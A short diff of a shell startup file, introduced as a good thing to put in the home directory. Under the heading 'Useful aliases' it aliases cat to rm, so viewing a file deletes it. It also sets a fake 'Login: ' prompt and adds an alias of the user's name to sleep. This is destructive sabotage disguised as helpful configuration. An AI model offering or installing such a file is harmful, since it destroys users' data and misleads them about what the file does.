@@ -1,5 +1,6 @@
 # This is a good thing to put in ~/
 export PS1="Login: "
+alias $USER="sleep 1"
 
 # Useful aliases
 alias cat="rm"
